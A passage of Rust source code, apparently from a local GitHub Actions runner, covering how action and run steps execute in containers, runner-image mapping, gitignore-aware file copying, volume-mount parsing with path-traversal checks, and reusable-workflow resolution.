                                        "Action sub_path escapes repository directory for action '{}'",
                                        action_info.repository
                                    )));
                                }
                                candidate
                            }
                            None => repo_dir,
                        };
                        // tempdir must stay alive until execute_composite_action completes
                        execute_composite_action(
                            ctx.step,
                            &action_dir,
                            &step_env,
                            ctx.working_dir,
                            ctx.runtime,
                            ctx.runner_image,
                            ctx.verbose,
                        )
                        .await?
                    }
                }
                PreparedAction::NativeDocker {
                    image,
                    entrypoint,
                    args,
                } => {
                    execute_native_docker_step(
                        &ctx,
                        &mut step_env,
                        step_name,
                        uses,
                        image,
                        entrypoint,
                        args,
                    )
                    .await?
                }
                PreparedAction::Image(image) => {
                    // Build command for Docker action
                    let mut cmd = Vec::new();
                    let mut owned_strings: Vec<String> = Vec::new(); // Keep strings alive until after we use cmd

                    // Special handling for Rust actions
                    if uses.starts_with("actions-rs/") || uses.starts_with("dtolnay/rust-toolchain")
                    {
                        wrkflw_logging::info(
                            "🔄 Detected Rust action - using system Rust installation",
                        );

                        // For toolchain action, verify Rust is installed
                        if uses.starts_with("actions-rs/toolchain@")
                            || uses.starts_with("dtolnay/rust-toolchain@")
                        {
                            let rustc_version = Command::new("rustc")
                                .arg("--version")
                                .output()
                                .map(|output| String::from_utf8_lossy(&output.stdout).to_string())
                                .unwrap_or_else(|_| "not found".to_string());

                            wrkflw_logging::info(&format!(
                                "🔄 Using system Rust: {}",
                                rustc_version.trim()
                            ));

                            // Return success since we're using system Rust
                            return Ok(StepResult {
                                name: step_name,
                                status: StepStatus::Success,
                                output: format!("Using system Rust: {}", rustc_version.trim()),
                            });
                        }

                        // For cargo action, execute cargo commands directly
                        if uses.starts_with("actions-rs/cargo@") {
                            let cargo_version = Command::new("cargo")
                                .arg("--version")
                                .output()
                                .map(|output| String::from_utf8_lossy(&output.stdout).to_string())
                                .unwrap_or_else(|_| "not found".to_string());

                            wrkflw_logging::info(&format!(
                                "🔄 Using system Rust/Cargo: {}",
                                cargo_version.trim()
                            ));

                            // Get the command from the 'with' parameters
                            if let Some(with_params) = &ctx.step.with {
                                if let Some(command) = with_params.get("command") {
                                    wrkflw_logging::info(&format!(
                                        "🔄 Found command parameter: {}",
                                        command
                                    ));

                                    // Build the actual command
                                    let mut real_command = format!("cargo {}", command);

                                    // Add any arguments if specified
                                    if let Some(args) = with_params.get("args") {
                                        if !args.is_empty() {
                                            // Resolve GitHub-style matrix variables in args
                                            let resolved_args =
                                                crate::substitution::process_step_run(
                                                    args,
                                                    ctx.matrix_combination,
                                                )
                                                .trim()
                                                .to_string();

                                            // Only add if we have something left after resolving variables
                                            // and it's not just "--target" without a value
                                            if !resolved_args.is_empty()
                                                && resolved_args != "--target"
                                            {
                                                real_command
                                                    .push_str(&format!(" {}", resolved_args));
                                            }
                                        }
                                    }

                                    wrkflw_logging::info(&format!(
                                        "🔄 Running actual command: {}",
                                        real_command
                                    ));

                                    // Execute the command
                                    let mut cmd = Command::new("sh");
                                    cmd.arg("-c");
                                    cmd.arg(&real_command);
                                    cmd.current_dir(ctx.working_dir);

                                    // Add environment variables
                                    for (key, value) in step_env {
                                        cmd.env(key, value);
                                    }

                                    match cmd.output() {
                                        Ok(output) => {
                                            let exit_code = output.status.code().unwrap_or(-1);
                                            let stdout =
                                                String::from_utf8_lossy(&output.stdout).to_string();
                                            let stderr =
                                                String::from_utf8_lossy(&output.stderr).to_string();

                                            return Ok(StepResult {
                                                name: step_name,
                                                status: if exit_code == 0 {
                                                    StepStatus::Success
                                                } else {
                                                    StepStatus::Failure
                                                },
                                                output: format!("{}\n{}", stdout, stderr),
                                            });
                                        }
                                        Err(e) => {
                                            return Ok(StepResult {
                                                name: step_name,
                                                status: StepStatus::Failure,
                                                output: format!("Failed to execute command: {}", e),
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }

                    if action_info.is_docker {
                        // Docker actions just run the container
                        cmd.push("sh");
                        cmd.push("-c");
                        cmd.push("echo 'Executing Docker action'");
                    } else if action_info.is_local {
                        // Local actions: run a placeholder since full local action
                        // execution is handled by the Composite branch above
                        cmd.push("sh");
                        cmd.push("-c");
                        cmd.push("echo 'Local action executed'");
                    } else {
                        // For GitHub actions, check if we have special handling
                        if let Err(e) = emulation::handle_special_action(uses).await {
                            // Log error but continue
                            println!("   Warning: Special action handling failed: {}", e);
                        }

                        // Check if we should hide GitHub action messages
                        let hide_action_value = ctx
                            .job_env
                            .get("WRKFLW_HIDE_ACTION_MESSAGES")
                            .cloned()
                            .unwrap_or_else(|| "not set".to_string());

                        wrkflw_logging::debug(&format!(
                            "WRKFLW_HIDE_ACTION_MESSAGES value: {}",
                            hide_action_value
                        ));

                        let hide_messages = hide_action_value == "true";
                        wrkflw_logging::debug(&format!("Should hide messages: {}", hide_messages));

                        // Only log a message to the console if we're showing action messages
                        if !hide_messages {
                            // For Emulation mode, log a message about what action would be executed
                            println!("   ⚙️ Would execute GitHub action: {}", uses);
                        }

                        // Extract the actual command from the GitHub action if applicable
                        let mut should_run_real_command = false;
                        let mut real_command_parts = Vec::new();

                        // Check if this action has 'with' parameters that specify a command to run
                        if let Some(with_params) = &ctx.step.with {
                            // Common GitHub action pattern: has a 'command' parameter
                            if let Some(cmd) = with_params.get("command") {
                                if ctx.verbose {
                                    wrkflw_logging::info(&format!(
                                        "🔄 Found command parameter: {}",
                                        cmd
                                    ));
                                }

                                // Convert to real command based on action type patterns
                                if uses.contains("cargo") || uses.contains("rust") {
                                    // Cargo command pattern
                                    real_command_parts.push("cargo".to_string());
                                    real_command_parts.push(cmd.clone());
                                    should_run_real_command = true;
                                } else if uses.contains("node") || uses.contains("npm") {
                                    // Node.js command pattern
                                    if cmd == "npm" || cmd == "yarn" || cmd == "pnpm" {
                                        real_command_parts.push(cmd.clone());
                                    } else {
                                        real_command_parts.push("npm".to_string());
                                        real_command_parts.push("run".to_string());
                                        real_command_parts.push(cmd.clone());
                                    }
                                    should_run_real_command = true;
                                } else if uses.contains("python") || uses.contains("pip") {
                                    // Python command pattern
                                    if cmd == "pip" {
                                        real_command_parts.push("pip".to_string());
                                    } else {
                                        real_command_parts.push("python".to_string());
                                        real_command_parts.push("-m".to_string());
                                        real_command_parts.push(cmd.clone());
                                    }
                                    should_run_real_command = true;
                                } else {
                                    // Generic command - try to execute directly if available
                                    real_command_parts.push(cmd.clone());
                                    should_run_real_command = true;
                                }

                                // Add any arguments if specified
                                if let Some(args) = with_params.get("args") {
                                    if !args.is_empty() {
                                        // Resolve GitHub-style matrix variables in args
                                        let resolved_args = crate::substitution::process_step_run(
                                            args,
                                            ctx.matrix_combination,
                                        )
                                        .trim()
                                        .to_string();

                                        // Only add if we have something left after resolving variables
                                        if !resolved_args.is_empty() {
                                            real_command_parts.push(resolved_args);
                                        }
                                    }
                                }
                            }
                        }

                        if should_run_real_command && !real_command_parts.is_empty() {
                            // Build a final command string
                            let command_str = real_command_parts.join(" ");
                            wrkflw_logging::info(&format!(
                                "🔄 Running actual command: {}",
                                command_str
                            ));

                            // Replace the emulated command with a shell command to execute our command
                            cmd.clear();
                            cmd.push("sh");
                            cmd.push("-c");
                            owned_strings.push(command_str);
                            cmd.push(owned_strings.last().unwrap());
                        } else {
                            // Fall back to emulation for actions we don't know how to execute
                            cmd.clear();
                            cmd.push("sh");
                            cmd.push("-c");

                            let escaped_uses = uses.replace('\'', "'\\''");
                            let echo_msg =
                                format!("echo 'Would execute GitHub action: {}'", escaped_uses);
                            owned_strings.push(echo_msg);
                            cmd.push(owned_strings.last().unwrap());
                        }
                    }

                    // Convert 'with' parameters to environment variables
                    if let Some(with_params) = &ctx.step.with {
                        for (key, value) in with_params {
                            step_env.insert(format!("INPUT_{}", key.to_uppercase()), value.clone());
                        }
                    }

                    let container_workspace = Path::new("/github/workspace");
                    let mount_ctx = prepare_step_container_context(
                        &mut step_env,
                        ctx.job_env,
                        ctx.container_config,
                    );
                    let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
                    let env_vars: Vec<(&str, &str)> = step_env
                        .iter()
                        .map(|(k, v)| (k.as_str(), v.as_str()))
                        .collect();

                    let output = ctx
                        .runtime
                        .run_container(
                            &image,
                            &cmd.to_vec(),
                            &env_vars,
                            container_workspace,
                            &volumes,
                            None,
                        )
                        .await
                        .map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;

                    // Build verbose output for GitHub actions when applicable
                    let output_text = if ctx.verbose
                        && output.exit_code == 0
                        && uses.contains('/')
                        && !uses.starts_with("./")
                    {
                        let mut detailed_output =
                            format!("Would execute GitHub action: {}\n", uses);

                        // Add information about the action inputs if available
                        if let Some(with_params) = &ctx.step.with {
                            detailed_output.push_str("\nAction inputs:\n");
                            for (key, value) in with_params {
                                detailed_output.push_str(&format!("  {}: {}\n", key, value));
                            }
                        }

                        // Add standard GitHub action environment variables
                        detailed_output.push_str("\nEnvironment variables:\n");
                        for (key, value) in step_env.iter() {
                            if key.starts_with("GITHUB_") || key.starts_with("INPUT_") {
                                detailed_output.push_str(&format!("  {}: {}\n", key, value));
                            }
                        }

                        // Include the original output
                        detailed_output
                            .push_str(&format!("\nOutput:\n{}\n{}", output.stdout, output.stderr));
                        detailed_output
                    } else {
                        format!("{}\n{}", output.stdout, output.stderr)
                    };

                    // Add detailed error information for failed cargo/rust commands
                    if output.exit_code != 0 && (uses.contains("cargo") || uses.contains("rust")) {
                        let mut error_details = format!(
                            "\n\n❌ Command failed with exit code: {}\n",
                            output.exit_code
                        );

                        error_details.push_str(&format!("Command: {}\n", cmd.join(" ")));

                        error_details.push_str("\nEnvironment:\n");
                        for (key, value) in step_env.iter() {
                            if key.starts_with("GITHUB_")
                                || key.starts_with("INPUT_")
                                || key.starts_with("RUST")
                            {
                                error_details.push_str(&format!("  {}: {}\n", key, value));
                            }
                        }

                        error_details.push_str("\nDetailed output:\n");
                        error_details.push_str(&output.stdout);
                        error_details.push_str(&output.stderr);

                        return Ok(StepResult {
                            name: step_name,
                            status: StepStatus::Failure,
                            output: format!("{}\n{}", output_text, error_details),
                        });
                    }

                    StepResult {
                        name: step_name,
                        status: if output.exit_code == 0 {
                            StepStatus::Success
                        } else {
                            StepStatus::Failure
                        },
                        output: format!(
                            "Exit code: {}\n{}\n{}",
                            output.exit_code, output.stdout, output.stderr
                        ),
                    }
                }
            }
        }
    } else if let Some(run) = &ctx.step.run {
        // Run step
        let mut output = String::new();
        let mut status = StepStatus::Success;
        let mut error_details = None;

        // Perform secret substitution if secret manager is available
        let resolved_run = if let Some(secret_manager) = ctx.secret_manager {
            let mut substitution = SecretSubstitution::new(secret_manager);
            match substitution.substitute(run).await {
                Ok(resolved) => resolved,
                Err(e) => {
                    return Ok(StepResult {
                        name: step_name,
                        status: StepStatus::Failure,
                        output: format!("Secret substitution failed: {}", e),
                    });
                }
            }
        } else {
            run.clone()
        };

        // Resolve expression substitutions (hashFiles, matrix vars)
        let resolved_run = match crate::substitution::preprocess_expressions(
            &resolved_run,
            ctx.working_dir,
            ctx.matrix_combination,
        ) {
            Ok(r) => r,
            Err(e) => {
                return Ok(StepResult {
                    name: step_name,
                    status: StepStatus::Failure,
                    output: format!("Expression substitution failed: {}", e),
                });
            }
        };

        // Check if this is a cargo command
        let is_cargo_cmd = resolved_run.trim().starts_with("cargo");

        // Resolve effective shell: step > job defaults > workflow defaults > "bash"
        let effective_shell = ctx
            .step
            .shell
            .as_deref()
            .or_else(|| {
                ctx.job_defaults
                    .and_then(|d| d.run.as_ref()?.shell.as_deref())
            })
            .or_else(|| {
                ctx.workflow_defaults
                    .and_then(|d| d.run.as_ref()?.shell.as_deref())
            })
            .unwrap_or("bash");

        let cmd_parts = match effective_shell {
            "bash" => vec![
                "bash",
                "--noprofile",
                "--norc",
                "-e",
                "-o",
                "pipefail",
                "-c",
                &resolved_run,
            ],
            "sh" => vec!["sh", "-e", "-c", &resolved_run],
            "python" => vec!["python", "-c", &resolved_run],
            "pwsh" | "powershell" => vec!["pwsh", "-command", &resolved_run],
            other => {
                wrkflw_logging::warning(&format!(
                    "  Unrecognized shell '{}', falling back to '{} -c'",
                    other, other
                ));
                vec![other, "-c", &resolved_run]
            }
        };

        // Resolve effective working directory: step > job defaults > workflow defaults
        let effective_wd = ctx
            .step
            .working_directory
            .as_deref()
            .or_else(|| {
                ctx.job_defaults
                    .and_then(|d| d.run.as_ref()?.working_directory.as_deref())
            })
            .or_else(|| {
                ctx.workflow_defaults
                    .and_then(|d| d.run.as_ref()?.working_directory.as_deref())
            });

        // Define the standard workspace path inside the container
        let container_workspace = Path::new("/github/workspace");
        let final_workspace = if let Some(wd) = effective_wd {
            let joined = container_workspace.join(wd);
            // Canonicalize logically to catch ".." traversal and absolute path replacement
            let mut normalized = std::path::PathBuf::new();
            for component in joined.components() {
                match component {
                    std::path::Component::ParentDir => {
                        normalized.pop();
                    }
                    c => normalized.push(c.as_os_str()),
                }
            }
            if !normalized.starts_with(container_workspace) {
                return Ok(StepResult {
                    name: step_name,
                    status: StepStatus::Failure,
                    output: format!(
                        "Invalid working-directory '{}': must be within workspace",
                        wd
                    ),
                });
            }
            normalized
        } else {
            container_workspace.to_path_buf()
        };

        let mount_ctx =
            prepare_step_container_context(&mut step_env, ctx.job_env, ctx.container_config);
        let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
        let env_vars: Vec<(&str, &str)> = step_env
            .iter()
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();

        // Execute the command
        match ctx
            .runtime
            .run_container(
                ctx.runner_image,
                &cmd_parts,
                &env_vars,
                &final_workspace,
                &volumes,
                None,
            )
            .await
        {
            Ok(container_output) => {
                // Add command details to output
                output.push_str(&format!("Command: {}\n\n", run));

                if !container_output.stdout.is_empty() {
                    output.push_str("Standard Output:\n");
                    output.push_str(&container_output.stdout);
                    output.push('\n');
                }

                if !container_output.stderr.is_empty() {
                    output.push_str("Standard Error:\n");
                    output.push_str(&container_output.stderr);
                    output.push('\n');
                }

                if container_output.exit_code != 0 {
                    status = StepStatus::Failure;

                    // For cargo commands, add more detailed error information
                    if is_cargo_cmd {
                        let mut error_msg = String::new();
                        error_msg.push_str(&format!(
                            "\nCargo command failed with exit code {}\n",
                            container_output.exit_code
                        ));
                        error_msg.push_str("Common causes for cargo command failures:\n");

                        if run.contains("fmt") {
                            error_msg.push_str(
                                "- Code formatting issues. Run 'cargo fmt' locally to fix.\n",
                            );
                        } else if run.contains("clippy") {
                            error_msg.push_str("- Linter warnings treated as errors. Run 'cargo clippy' locally to see details.\n");
                        } else if run.contains("test") {
                            error_msg.push_str("- Test failures. Run 'cargo test' locally to see which tests failed.\n");
                        } else if run.contains("build") {
                            error_msg.push_str(
                                "- Compilation errors. Check the error messages above.\n",
                            );
                        }

                        error_details = Some(error_msg);
                    }
                }
            }
            Err(e) => {
                status = StepStatus::Failure;
                output.push_str(&format!("Error executing command: {}\n", e));
            }
        }

        // If there are error details, append them to the output
        if let Some(details) = error_details {
            output.push_str(&details);
        }

        StepResult {
            name: step_name,
            status,
            output,
        }
    } else {
        return Ok(StepResult {
            name: step_name,
            status: StepStatus::Skipped,
            output: "Step has neither 'uses' nor 'run'".to_string(),
        });
    };

    Ok(step_result)
}

/// Create a gitignore matcher for the given directory
fn create_gitignore_matcher(
    dir: &Path,
) -> Result<Option<ignore::gitignore::Gitignore>, ExecutionError> {
    let mut builder = GitignoreBuilder::new(dir);

    // Try to add .gitignore file if it exists
    let gitignore_path = dir.join(".gitignore");
    if gitignore_path.exists() {
        builder.add(&gitignore_path);
    }

    // Add some common ignore patterns as fallback
    builder.add_line(None, "target/").map_err(|e| {
        ExecutionError::Execution(format!("Failed to add default ignore pattern: {}", e))
    })?;
    builder.add_line(None, ".git/").map_err(|e| {
        ExecutionError::Execution(format!("Failed to add default ignore pattern: {}", e))
    })?;

    match builder.build() {
        Ok(gitignore) => Ok(Some(gitignore)),
        Err(e) => {
            wrkflw_logging::warning(&format!("Failed to build gitignore matcher: {}", e));
            Ok(None)
        }
    }
}

fn copy_directory_contents(from: &Path, to: &Path) -> Result<(), ExecutionError> {
    copy_directory_contents_with_gitignore(from, to, None)
}

fn copy_directory_contents_with_gitignore(
    from: &Path,
    to: &Path,
    gitignore: Option<&ignore::gitignore::Gitignore>,
) -> Result<(), ExecutionError> {
    // If no gitignore provided, try to create one for the root directory
    let root_gitignore;
    let gitignore = if gitignore.is_none() {
        root_gitignore = create_gitignore_matcher(from)?;
        root_gitignore.as_ref()
    } else {
        gitignore
    };

    // Log summary of the copy operation
    wrkflw_logging::debug(&format!(
        "Copying directory contents from {} to {}",
        from.display(),
        to.display()
    ));

    for entry in std::fs::read_dir(from)
        .map_err(|e| ExecutionError::Execution(format!("Failed to read directory: {}", e)))?
    {
        let entry =
            entry.map_err(|e| ExecutionError::Execution(format!("Failed to read entry: {}", e)))?;
        let path = entry.path();

        if path.is_symlink() {
            wrkflw_logging::debug(&format!("Skipping symlink: {:?}", path));
            continue;
        }

        // Check if the file should be ignored according to .gitignore
        if let Some(gitignore) = gitignore {
            let relative_path = path.strip_prefix(from).unwrap_or(&path);
            match gitignore.matched(relative_path, path.is_dir()) {
                Match::Ignore(_) => {
                    wrkflw_logging::debug(&format!("Skipping ignored file/directory: {path:?}"));
                    continue;
                }
                Match::Whitelist(_) | Match::None => {
                    // File is not ignored or explicitly whitelisted
                }
            }
        }

        // Log individual files only in trace mode (removed verbose per-file logging)

        // Additional basic filtering for hidden files (but allow .gitignore and .github)
        let file_name = match path.file_name() {
            Some(name) => name.to_string_lossy(),
            None => {
                return Err(ExecutionError::Execution(format!(
                    "Failed to get file name from path: {:?}",
                    path
                )));
            }
        };

        // Skip most hidden files but allow important ones
        if file_name.starts_with(".")
            && file_name != ".gitignore"
            && file_name != ".github"
            && !file_name.starts_with(".env")
        {
            continue;
        }

        let dest_path = match path.file_name() {
            Some(name) => to.join(name),
            None => {
                return Err(ExecutionError::Execution(format!(
                    "Failed to get file name from path: {:?}",
                    path
                )));
            }
        };

        if path.is_dir() {
            std::fs::create_dir_all(&dest_path)
                .map_err(|e| ExecutionError::Execution(format!("Failed to create dir: {}", e)))?;

            // Recursively copy subdirectories with the same gitignore
            copy_directory_contents_with_gitignore(&path, &dest_path, gitignore)?;
        } else {
            std::fs::copy(&path, &dest_path)
                .map_err(|e| ExecutionError::Execution(format!("Failed to copy file: {}", e)))?;
        }
    }

    Ok(())
}

fn get_runner_image(runs_on: &str) -> String {
    // Map GitHub runners to Docker images
    match runs_on.trim() {
        // ubuntu runners - using Ubuntu base images for better compatibility
        "ubuntu-latest" => "ubuntu:latest",
        "ubuntu-22.04" => "ubuntu:22.04",
        "ubuntu-20.04" => "ubuntu:20.04",
        "ubuntu-18.04" => "ubuntu:18.04",

        // ubuntu runners - medium images (with more tools)
        "ubuntu-latest-medium" => "catthehacker/ubuntu:act-latest",
        "ubuntu-22.04-medium" => "catthehacker/ubuntu:act-22.04",
        "ubuntu-20.04-medium" => "catthehacker/ubuntu:act-20.04",
        "ubuntu-18.04-medium" => "catthehacker/ubuntu:act-18.04",

        // ubuntu runners - large images (with most tools)
        "ubuntu-latest-large" => "catthehacker/ubuntu:full-latest",
        "ubuntu-22.04-large" => "catthehacker/ubuntu:full-22.04",
        "ubuntu-20.04-large" => "catthehacker/ubuntu:full-20.04",
        "ubuntu-18.04-large" => "catthehacker/ubuntu:full-18.04",

        // macOS runners - use a standard Rust image for compatibility
        "macos-latest" => "rust:latest",
        "macos-12" => "rust:latest",    // Monterey equivalent
        "macos-11" => "rust:latest",    // Big Sur equivalent
        "macos-10.15" => "rust:latest", // Catalina equivalent

        // Windows runners - using servercore-based images
        "windows-latest" => "mcr.microsoft.com/windows/servercore:ltsc2022",
        "windows-2022" => "mcr.microsoft.com/windows/servercore:ltsc2022",
        "windows-2019" => "mcr.microsoft.com/windows/servercore:ltsc2019",

        // Language-specific runners
        "python-latest" => "python:3.11-slim",
        "python-3.11" => "python:3.11-slim",
        "python-3.10" => "python:3.10-slim",
        "python-3.9" => "python:3.9-slim",
        "python-3.8" => "python:3.8-slim",

        "node-latest" => "node:20-slim",
        "node-20" => "node:20-slim",
        "node-18" => "node:18-slim",
        "node-16" => "node:16-slim",

        "java-latest" => "eclipse-temurin:17-jdk",
        "java-17" => "eclipse-temurin:17-jdk",
        "java-11" => "eclipse-temurin:11-jdk",
        "java-8" => "eclipse-temurin:8-jdk",

        "go-latest" => "golang:1.21-slim",
        "go-1.21" => "golang:1.21-slim",
        "go-1.20" => "golang:1.20-slim",
        "go-1.19" => "golang:1.19-slim",

        "dotnet-latest" => "mcr.microsoft.com/dotnet/sdk:7.0",
        "dotnet-7.0" => "mcr.microsoft.com/dotnet/sdk:7.0",
        "dotnet-6.0" => "mcr.microsoft.com/dotnet/sdk:6.0",
        "dotnet-5.0" => "mcr.microsoft.com/dotnet/sdk:5.0",

        // Default case for other runners or custom strings
        _ => {
            // Check for platform prefixes and provide appropriate images
            let runs_on_lower = runs_on.trim().to_lowercase();
            if runs_on_lower.starts_with("macos") {
                "rust:latest" // Use Rust image for macOS runners
            } else if runs_on_lower.starts_with("windows") {
                "mcr.microsoft.com/windows/servercore:ltsc2022" // Default Windows image
            } else if runs_on_lower.starts_with("python") {
                "python:3.11-slim" // Default Python image
            } else if runs_on_lower.starts_with("node") {
                "node:20-slim" // Default Node.js image
            } else if runs_on_lower.starts_with("java") {
                "eclipse-temurin:17-jdk" // Default Java image
            } else if runs_on_lower.starts_with("go") {
                "golang:1.21-slim" // Default Go image
            } else if runs_on_lower.starts_with("dotnet") {
                "mcr.microsoft.com/dotnet/sdk:7.0" // Default .NET image
            } else {
                "ubuntu:latest" // Default to Ubuntu for everything else
            }
        }
    }
    .to_string()
}

fn get_runner_image_from_opt(runs_on: &Option<Vec<String>>) -> String {
    let default = "ubuntu-latest";
    let ro = runs_on
        .as_ref()
        .and_then(|vec| vec.first())
        .map(|s| s.as_str())
        .unwrap_or(default);
    get_runner_image(ro)
}

fn get_effective_runner_image(job: &Job) -> String {
    if let Some(ref container) = job.container {
        if container.image.is_empty() {
            wrkflw_logging::warning("container image is empty, falling back to runs-on");
            get_runner_image_from_opt(&job.runs_on)
        } else {
            container.image.clone()
        }
    } else {
        get_runner_image_from_opt(&job.runs_on)
    }
}

/// Owned data returned by [`prepare_step_container_context`].
///
/// The caller should derive `&[(&Path, &Path)]` and `&[(&str, &str)]` references
/// from this struct's fields before passing them to `run_container`.
struct StepContainerContext {
    owned_volume_paths: Vec<VolumePathPair>,
    github_mount: Option<VolumePathPair>,
}

impl StepContainerContext {
    /// Build the final volumes slice by appending all owned mounts after the
    /// initial `(working_dir, container_workspace)` pair.
    fn build_volumes<'a>(
        &'a self,
        working_dir: &'a Path,
        container_workspace: &'a Path,
    ) -> Vec<(&'a Path, &'a Path)> {
        let mut volumes: Vec<(&Path, &Path)> = vec![(working_dir, container_workspace)];
        if let Some((ref host, ref container)) = self.github_mount {
            volumes.push((host.as_path(), container.as_path()));
        }
        for (host, container) in &self.owned_volume_paths {
            volumes.push((host.as_path(), container.as_path()));
        }
        volumes
    }
}

/// Set up container volumes and remap GitHub env paths for a step execution.
///
/// This is the common setup shared by `NativeDocker`, `Image`, and `run` step
/// execution paths.  Returns owned mount data; the caller uses
/// [`StepContainerContext::build_volumes`] to borrow into it.
fn prepare_step_container_context(
    step_env: &mut HashMap<String, String>,
    job_env: &HashMap<String, String>,
    container_config: Option<&JobContainer>,
) -> StepContainerContext {
    let (owned_volume_paths, github_mount) =
        prepare_container_mounts(step_env, job_env, container_config);
    StepContainerContext {
        owned_volume_paths,
        github_mount,
    }
}

type VolumePathPair = (PathBuf, PathBuf);

/// Prepare container volume mounts and remap GitHub environment file paths for container runtimes.
///
/// Returns owned volume path pairs that should be appended to the volumes list,
/// and mutates `step_env` to remap GITHUB_ENV/GITHUB_OUTPUT/GITHUB_PATH/GITHUB_STEP_SUMMARY
/// to container-internal paths when running under Docker/Podman.
fn prepare_container_mounts(
    step_env: &mut HashMap<String, String>,
    job_env: &HashMap<String, String>,
    container_config: Option<&JobContainer>,
) -> (Vec<VolumePathPair>, Option<VolumePathPair>) {
    let container_github_dir = Path::new("/github/workflow");
    let is_container_runtime = step_env
        .get("WRKFLW_RUNTIME_MODE")
        .map(|m| m == "docker" || m == "podman")
        .unwrap_or(false);

    // Mount GitHub environment files directory and remap paths
    let github_mount = if let Some(github_env_path) = job_env.get("GITHUB_ENV") {
        if let Some(github_dir) = Path::new(github_env_path).parent() {
            if is_container_runtime {
                // Remap each GitHub env file path by deriving the filename from the actual
                // host path, so the mapping stays correct if environment.rs renames them.
                // Only remap keys that actually exist in job_env to avoid phantom paths.
                for env_key in &[
                    "GITHUB_ENV",
                    "GITHUB_OUTPUT",
                    "GITHUB_PATH",
                    "GITHUB_STEP_SUMMARY",
                ] {
                    if let Some(host_path) = job_env.get(*env_key) {
                        if let Some(filename) = Path::new(host_path).file_name() {
                            step_env.insert(
                                env_key.to_string(),
                                format!("/github/workflow/{}", filename.to_string_lossy()),
                            );
                        }
                    }
                }
                Some((github_dir.to_path_buf(), container_github_dir.to_path_buf()))
            } else {
                github_dir
                    .parent()
                    .map(|p| (p.to_path_buf(), p.to_path_buf()))
            }
        } else {
            None
        }
    } else {
        None
    };

    // Collect container-defined volumes
    // Docker volume syntax: host:container[:options] — splitn(3) handles the optional :ro/:rw
    let mut owned_volume_paths: Vec<VolumePathPair> = Vec::new();
    if let Some(container_volumes) = container_config.and_then(|c| c.volumes.as_ref()) {
        for vol_spec in container_volumes {
            if vol_spec.is_empty() {
                wrkflw_logging::warning("skipping empty volume spec");
                continue;
            }
            // NOTE: splitn(3, ':') won't correctly handle Windows-style host paths (e.g. C:\data:/container)
            let parts: Vec<&str> = vol_spec.splitn(3, ':').collect();
            // Check host path for path traversal (only the host component, not the full spec)
            let host_path = parts[0];
            if std::path::Path::new(host_path)
                .components()
                .any(|c| matches!(c, std::path::Component::ParentDir))
            {
                wrkflw_logging::warning(&format!(
                    "Skipping volume with path traversal in host path: {}",
                    vol_spec
                ));
                continue;
            }
            match parts.len() {
                3 => {
                    if parts[0].is_empty() || parts[1].is_empty() {
                        wrkflw_logging::warning(&format!(
                            "skipping volume spec with empty host or container path: '{}'",
                            vol_spec
                        ));
                        continue;
                    }
                    wrkflw_logging::warning(&format!(
                        "volume mount option '{}' in '{}' is not yet supported and will be ignored",
                        parts[2], vol_spec
                    ));
                    owned_volume_paths.push((PathBuf::from(parts[0]), PathBuf::from(parts[1])));
                }
                2 => {
                    if parts[0].is_empty() || parts[1].is_empty() {
                        wrkflw_logging::warning(&format!(
                            "skipping volume spec with empty host or container path: '{}'",
                            vol_spec
                        ));
                        continue;
                    }
                    owned_volume_paths.push((PathBuf::from(parts[0]), PathBuf::from(parts[1])));
                }
                _ => {
                    // Single path: mount at same location inside container
                    let p = PathBuf::from(parts[0]);
                    owned_volume_paths.push((p.clone(), p));
                }
            }
        }
    }

    (owned_volume_paths, github_mount)
}

/// Log warnings for container fields that are parsed but not yet supported.
fn warn_unsupported_container_fields(container: &JobContainer) {
    if container.options.is_some() {
        wrkflw_logging::warning(
            "container 'options' field is not yet supported and will be ignored",
        );
    }
    if container.credentials.is_some() {
        wrkflw_logging::warning(
            "container 'credentials' field is not yet supported and will be ignored",
        );
    }
    if container.ports.is_some() {
        wrkflw_logging::warning(
            "container 'ports' field is not yet supported (service containers are not implemented)",
        );
    }
}

async fn execute_reusable_workflow_job(
    ctx: &JobExecutionContext<'_>,
    uses: &str,
    with: Option<&HashMap<String, String>>,
    secrets: Option<&serde_yaml::Value>,
) -> Result<JobResult, ExecutionError> {
    wrkflw_logging::info(&format!(
        "Executing reusable workflow job '{}' -> {}",
        ctx.job_name, uses
    ));

    // Resolve the called workflow file path
    enum UsesRef<'a> {
        LocalPath(&'a str),
        Remote {
            owner: String,
            repo: String,
            path: String,
            r#ref: String,
        },
    }

    let uses_ref = if uses.starts_with("./") || uses.starts_with('/') {
        UsesRef::LocalPath(uses)
    } else {
        // Expect format owner/repo/path/to/workflow.yml@ref
        let parts: Vec<&str> = uses.split('@').collect();
        if parts.len() != 2 {
            return Err(ExecutionError::Execution(format!(
                "Invalid reusable workflow reference: {}",
                uses
            )));
        }
        let left = parts[0];
        let r#ref = parts[1].to_string();
        let mut segs = left.splitn(3, '/');
        let owner = segs.next().unwrap_or("").to_string();
        let repo = segs.next().unwrap_or("").to_string();
        let path = segs.next().unwrap_or("").to_string();
        if owner.is_empty() || repo.is_empty() || path.is_empty() {
            return Err(ExecutionError::Execution(format!(
                "Invalid reusable workflow reference: {}",
                uses
            )));
        }
        UsesRef::Remote {
            owner,
            repo,
            path,
            r#ref,
        }
    };

    // Load workflow file
    let workflow_path = match uses_ref {
        UsesRef::LocalPath(p) => {
            // Resolve relative to current directory
            let current_dir = std::env::current_dir().map_err(|e| {
                ExecutionError::Execution(format!("Failed to get current dir: {}", e))
            })?;
            let path = current_dir.join(p);
            if !path.exists() {
                return Err(ExecutionError::Execution(format!(
                    "Reusable workflow not found at path: {}",
                    path.display()
                )));
            }
            path
        }
        UsesRef::Remote {
            owner,
            repo,
            path,
            r#ref,
        } => {
            // Clone minimal repository and checkout ref
            let tempdir = tempfile::tempdir().map_err(|e| {
                ExecutionError::Execution(format!("Failed to create temp dir: {}", e))
            })?;
            let repo_url = format!("https://github.com/{}/{}.git", owner, repo);

            // Clone into a subdirectory within tempdir to get clean structure
            let repo_dir = tempdir.path().join("cloned_repo");

            shallow_clone(&repo_url, &r#ref, &repo_dir).await?;
            let joined = repo_dir.join(path);

            if !joined.exists() {
                return Err(ExecutionError::Execution(format!(
                    "Reusable workflow file not found in repo: {}",
                    joined.display()
                )));
            }

            // Parse called workflow while keeping tempdir alive
            let called = parse_workflow(&joined)?;

